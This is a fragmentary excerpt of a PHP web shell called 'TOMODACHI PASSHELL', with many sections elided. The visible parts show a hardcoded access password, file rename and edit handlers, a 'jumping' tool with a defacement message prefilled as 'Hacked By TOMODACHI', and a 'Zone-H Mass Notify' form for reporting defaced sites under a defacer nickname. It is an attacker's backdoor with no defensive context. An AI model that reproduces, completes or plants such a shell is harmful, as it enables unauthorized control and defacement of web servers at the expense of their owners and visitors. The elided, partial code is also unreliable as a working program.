...
$MyPass = 'version2023shell'; // Password Default: TOMODACHISHELL
function dup($pass,$n){
if($_GET['pass'] == $pass){
$f =  __FILE__;
$d =  __DIR__;
...
<html>
<head>
    <title>[ xXx TOMODACHI PASSHELL xXx ]</title>
...
echo "<center><font size='6px' color='lavender'>TOMODACHI PASSHELL</font><br></center>
    <div class='pausi'>
...
if ($_GET['logout'] == 'true') {
    ...
    if ($_GET['action'] == 'rename') {
        ...
        if (!empty($_POST['pausiganteng'])) {
            ...
            if ($res) {
                echo "<h3 class=center style='color:green'>Edit Berhasil</h3>";
            } else {
                echo "<h4 class=center style='color:red'>Gagal</h4>";
            }
        }
    ...
    if ($_GET['tools'] == 'jumping') {
        ...
        if ($_POST['start']) {
            ...
            <textarea name='script' style='width: 450px; height: 200px;'>Hacked By TOMODACHI</textarea><br>
        ...
        <font size='7' color='red' face='Orbitron'>Zone-H Mass Notify</font><br>";
            echo "<br>
            <form method='post'>
            <input style='width: 350px;' type='text' name='nick' placeholder='Defacer' value=TOMODACHI><br><br>
...
{
    global $MyPass;
    echo "  <title>TOMODACHI PASSHELL</title>
